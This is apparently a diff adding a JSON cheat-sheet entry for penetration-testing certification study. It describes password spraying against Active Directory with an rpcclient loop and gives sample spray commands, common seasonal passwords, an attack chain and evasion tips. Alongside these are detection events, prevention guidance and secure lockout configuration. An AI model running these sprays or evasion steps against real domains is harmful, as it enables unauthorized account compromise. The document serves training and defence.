@@ -1,0 +1,80 @@
+{
+  "id": "ad-rpcclient-spray",
+  "name": "rpcclient - Password Spray via MS-RPC",
+  "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>/dev/null | grep 'Account Name'; done",
+  "description": "Sprays one password against a user list via MS-RPC (port 445/TCP). Alternative to Kerberos and SMB-based spray methods. Useful when Kerberos spray is blocked and you need a fallback. Successful auth returns 'Account Name' output; failures return nothing.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Password Attacks",
+  "subcategory": "Password Spraying",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "password-spraying",
+    "rpcclient",
+    "rpc",
+    "smb",
+    "ms-rpc"
+  ],
+  "mitre": [
+    "T1110.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY RPCCLIENT FOR SPRAYING ===\nrpcclient uses MS-RPC over SMB (port 445) to authenticate, then runs a command.\nThe spray logic is: try auth, if it works the getusername command returns output,\nif auth fails rpcclient exits silently. grep filters for success.\n\n=== HOW TO READ OUTPUT ===\nSuccess:  Account Name: jsmith, Authority Name: INLANEFREIGHT\nFailure:  (empty — rpcclient exits, grep finds nothing)\nPipe | grep 'Account Name' shows only successful authentications.\n\n=== WHEN TO USE RPCCLIENT SPRAY ===\nUse when:\n  - Kerberos spray (kerbrute) is being blocked\n  - CME spray is being detected/rate-limited\n  - You want a third spray vector to rotate through\n  - You're testing RPC access for later enumeration use\n\n=== LOCKOUT CAUTION ===\nThis loop has NO built-in lockout awareness — it will blast every user at\nfull speed. Always check lockout policy before running:\n  crackmapexec smb <dc> -u user -p pass --pass-pol\nConsider adding sleep: sleep 1 after each iteration if threshold is low.\n\n=== SPRAY CHAIN ===\n1. Enumerate lockout policy\n2. Build valid user list (kerbrute userenum or CME --users)\n3. Choose password (season+year, company+1!, Welcome+year)\n4. Spray (kerbrute → CME SMB → rpcclient as fallback)\n5. Validate hits with CME (check Pwn3d!)\n6. Feed creds into BloodHound + Evil-WinRM",
+  "examples": [
+    {
+      "label": "Spray against DC",
+      "command": "for u in $(cat valid_users.txt); do rpcclient -U \"$u%Welcome1\" -c 'getusername;quit' 172.16.5.5 2>/dev/null | grep 'Account Name'; done"
+    },
+    {
+      "label": "With username visible in output",
+      "command": "for u in $(cat valid_users.txt); do echo \"Trying $u\"; rpcclient -U \"$u%Spring2022\" -c 'getusername;quit' 172.16.5.5 2>/dev/null | grep 'Account Name'; done"
+    }
+  ],
+  "references": [
+    {
+      "title": "rpcclient man page",
+      "url": "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-evil-winrm",
+      "rel": "next",
+      "note": "Use the recovered creds."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Sprays credentials over MS-RPC via rpcclient, useful from Linux without domain tooling.",
+    "prerequisites": "A domain user list, candidate password(s), and network access to the auth service.",
+    "impact": "Validated credentials over RPC.",
+    "detection": "Failed-authentication bursts: Windows 4625 / Kerberos 4771; account lockouts (4740). Spraying = one password across MANY accounts (few failures each - a subtle, distributed pattern). Defender for Identity flags spraying.",
+    "artifacts": "RPC auth attempts across accounts; 4625 bursts.",
+    "prevention": "[MITRE T1110.003 M1032 MFA] MFA defeats spraying; [M1027] strong/unique passwords + [M1036 Account Use Policies] lockout thresholds; alert on distributed failed logons and impossible travel.",
+    "evasion": "Spray one password low-and-slow with delays to avoid lockouts and volume alerts; rotate source hosts; Kerberos-based spraying avoids 4625.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1110.003"
+    ],
+    "misconfiguration": "The domain's lockout policy is either disabled or set with a threshold high enough (e.g., 10 attempts before lockout) that a low-and-slow spray — one guess per account per 30 minutes — never triggers lockout. Additionally, many accounts share the same simple passwords (company name + year, Season+Year), and the bad-password counter resets after the observation window elapses.",
+    "vulnerable_config": "# Weak lockout policy (domain default or intentionally lenient):\n# Fine-Grained Password Policy:\nGet-ADDefaultDomainPasswordPolicy\n# LockoutObservationWindow: 00:30:00\n# LockoutThreshold:         0          <-- DISABLED! No lockout ever\n# OR: LockoutThreshold: 10 (attacker sprays 9 per window, never locks)\n\n# Also: accounts with password = company name:\n# Common passwords: Summer2023!, Winter2024!, CompanyName1!",
+    "secure_config": "# Set a strong lockout policy:\n# Via Default Domain Policy or Fine-Grained Password Policy (PSO):\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00 \\\n    -LockoutThreshold 5\n# LockoutThreshold 5 means 5 bad attempts in 30 min = 30-min lockout\n\n# Fine-Grained PSO for admins (stricter):\nNew-ADFineGrainedPasswordPolicy -Name AdminPSO \\\n    -LockoutThreshold 3 -LockoutDuration 01:00:00 \\\n    -LockoutObservationWindow 01:00:00 \\\n    -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject AdminPSO -Subjects 'Domain Admins'\n\n# Enable Azure AD / Entra ID Password Protection (bans common passwords):\n# Also available on-premises via the Azure AD Password Protection agent\n\n# Monitor Event 4740 (Account Locked Out) — spray leaves a cluster of these"
+  },
+  "tools": [
+    "rpcclient"
+  ]
+}
